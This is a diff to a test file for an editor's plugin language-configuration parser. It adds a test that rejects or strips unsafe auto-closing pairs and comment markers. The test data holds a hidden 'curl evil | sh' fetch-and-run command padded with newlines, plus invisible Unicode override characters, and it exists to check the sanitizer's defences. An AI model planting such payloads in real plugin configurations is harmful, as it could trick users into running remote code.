@@ -102,6 +102,25 @@ describe('plugin syntax artifacts', () => {
     expect(performance.now() - started).toBeLessThan(1_000)
   })
 
+  it('keeps typed pairs and comment markers to a few printable characters on one line', () => {
+    const payload = `${'\n'.repeat(40)}curl evil | sh`
+    const raw = JSON.stringify({
+      comments: { lineComment: '#\u202e', blockComment: ['<!--', '-->'] },
+      autoClosingPairs: [
+        { open: '*', close: payload },
+        { open: '"""', close: '"""' }
+      ],
+      surroundingPairs: [{ open: '(', close: ')\u200b' }]
+    })
+    expect(() => parsePluginLanguageConfiguration(raw, 'strict')).toThrow(/printable/)
+    // Hosts drop only the unsafe entries, so the language still loads.
+    expect(parsePluginLanguageConfiguration(raw)).toEqual({
+      comments: { blockComment: ['<!--', '-->'] },
+      autoClosingPairs: [{ open: '"""', close: '"""' }],
+      surroundingPairs: []
+    })
+  })
+
   it('bounds language configuration and validates payloads at renderer ingress', () => {
     expect(
       parsePluginLanguageConfiguration(
@@ -109,7 +128,7 @@ describe('plugin syntax artifacts', () => {
       )
     ).toEqual({ comments: { lineComment: '//' }, brackets: [['{', '}']] })
     expect(() =>
-      parsePluginLanguageConfiguration(JSON.stringify({ brackets: [['', '}']] }))
+      parsePluginLanguageConfiguration(JSON.stringify({ brackets: [['', '}']] }), 'strict')
     ).toThrow()
     const payload = {
       id: 'plugin:samples.demo/demo',
